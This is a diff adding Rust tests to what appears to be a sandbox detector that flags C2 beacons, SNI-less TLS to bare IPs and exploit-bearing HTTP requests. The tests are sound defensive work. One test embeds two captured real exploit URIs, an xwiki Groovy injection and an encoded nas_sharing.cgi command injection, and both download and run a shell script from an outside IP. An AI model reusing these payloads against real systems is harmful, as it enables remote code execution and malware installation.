@@ -481,3 +481,122 @@ pub fn a_packet_row_opens_its_frame_and_never_a_call() {
     assert_eq!(row.key, (0, 0, 42));
     assert_eq!(row.cells[3].text, "VM-wide (capture)");
 }
+
+#[test]
+pub fn a_hard_coded_address_the_run_looked_up_is_no_beacon() {
+    // The same calls as a bot's beacon, but a DNS answer gave the address.
+    let mut calls = vec![socket(1, 2, 1, 3)];
+    for n in 0..4u64 {
+        calls.push(at(
+            with_entry(
+                sys(1, 42, "connect", [3, 0x1000, 16, 0, 0, 0], 0),
+                "arg1.address",
+                &address(2, [198, 51, 100, 1], 54128),
+            ),
+            (n + 1) * 30 * SECOND,
+        ));
+    }
+    let beacon = Capture::new().calls(calls.clone()).finish();
+    assert!(rules_of(&beacon).contains(&"network.c2_ip_literal".to_owned()));
+    let mut looked_up = Capture::new().calls(calls);
+    looked_up.frame(
+        FrameKind::Dns,
+        &dns(1, 1, "gays.shieldbytes.net", 0, &["198.51.100.1"], "A"),
+        "10.0.2.3",
+        "53",
+    );
+    let out = looked_up.finish();
+    assert!(!rules_of(&out).contains(&"network.c2_ip_literal".to_owned()));
+}
+
+#[test]
+pub fn tls_with_no_server_name_to_a_bare_address_is_low() {
+    // A33: the Sliver implant's TLS session to 129.151.184.17:443, no SNI.
+    // The implant's own connect ties the packet to it; seen only on the
+    // network, the row is one tier lower (info).
+    let hello = session(1, 1, "TLSv1.3", "client hello", "", "");
+    let mut capture = Capture::new().calls(vec![
+        socket(1, 2, 1, 3),
+        with_entry(
+            sys(1, 42, "connect", [3, 0x1000, 16, 0, 0, 0], 0),
+            "arg1.address",
+            &address(2, [129, 151, 184, 17], 443),
+        ),
+    ]);
+    capture.frame(FrameKind::Session, &hello, "129.151.184.17", "443");
+    let out = capture.finish();
+    assert_eq!(tier(&out, "network.tls_ip_literal").as_deref(), Some("low"));
+    let mut wide = Capture::new();
+    wide.frame(FrameKind::Session, &hello, "129.151.184.17", "443");
+    assert_eq!(
+        tier(&wide.finish(), "network.tls_ip_literal").as_deref(),
+        Some("info")
+    );
+    // A named server, or an address a lookup gave, is not.
+    let mut named = Capture::new();
+    named.frame(
+        FrameKind::Session,
+        &session(1, 1, "TLSv1.3", "client hello", "api.example.com", ""),
+        "129.151.184.17",
+        "443",
+    );
+    assert!(!has(&named.finish(), "network.tls_ip_literal"));
+    let mut resolved = Capture::new();
+    resolved.frame(
+        FrameKind::Dns,
+        &dns(1, 1, "c2.example.net", 0, &["129.151.184.17"], "A"),
+        "10.0.2.3",
+        "53",
+    );
+    resolved.frame(FrameKind::Session, &hello, "129.151.184.17", "443");
+    assert!(!has(&resolved.finish(), "network.tls_ip_literal"));
+}
+
+#[test]
+pub fn http_requests_carrying_a_download_command_are_exploits() {
+    // A15, run 122797288: an xwiki Groovy injection and a nas_sharing.cgi
+    // command in base64 of hex escapes, both fetching ghost.sh.
+    let xwiki = "/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D+%7B%7Bgroovy%7D%7D+println%28%22cd+%2Ftmp%3B+wget+http%3A%2F%2F94.154.43.158%2Fghost.sh%3B+chmod+777+ghost.sh%3B+sh+ghost.sh%22.execute%28%29%29";
+    let nas = "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobyAtZSBceDc3XHg2N1x4NjVceDc0XHgyMFx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDM5XHgzNFx4MmVceDMxXHgzNVx4MzRceDJlXHgzNFx4MzNceDJlXHgzMVx4MzVceDM4XHgyZlx4NjdceDY4XHg2Zlx4NzNceDc0XHgyZVx4NzNceDY4";
+    assert!(super::super::frames::exploit_payload(xwiki)
+        .is_some_and(|command| command.starts_with("wget http://94.154.43.158/ghost.sh")));
+    assert!(
+        super::super::frames::exploit_payload(nas)
+            .is_some_and(|command| command.contains("ghost.sh")),
+        "{:?}",
+        super::super::frames::exploit_payload(nas)
+    );
+    let mut capture = Capture::new().calls(vec![
+        socket(1, 2, 1, 3),
+        with_entry(
+            sys(1, 42, "connect", [3, 0x1000, 16, 0, 0, 0], 0),
+            "arg1.address",
+            &address(2, [22, 0, 108, 58], 8080),
+        ),
+    ]);
+    for (frame, uri) in [(1, xwiki), (2, nas), (3, xwiki)] {
+        capture.frame(
+            FrameKind::Http,
+            &http(frame, frame, "22.0.108.58:8080", uri),
+            "22.0.108.58",
+            "8080",
+        );
+    }
+    let out = capture.finish();
+    let row = rows(&out, "lateral.exploit_payload");
+    assert_eq!(row.len(), 1);
+    assert_eq!(text(row[0], "finding.tier"), "high");
+    assert_eq!(count(row[0]), 3);
+    // An ordinary download link is not.
+    for benign in [
+        "/download?file=wget-1.21.tar.gz",
+        "/docs/curl.html",
+        "/search?q=how+to+use+wget",
+    ] {
+        assert_eq!(
+            super::super::frames::exploit_payload(benign),
+            None,
+            "{benign}"
+        );
+    }
+}
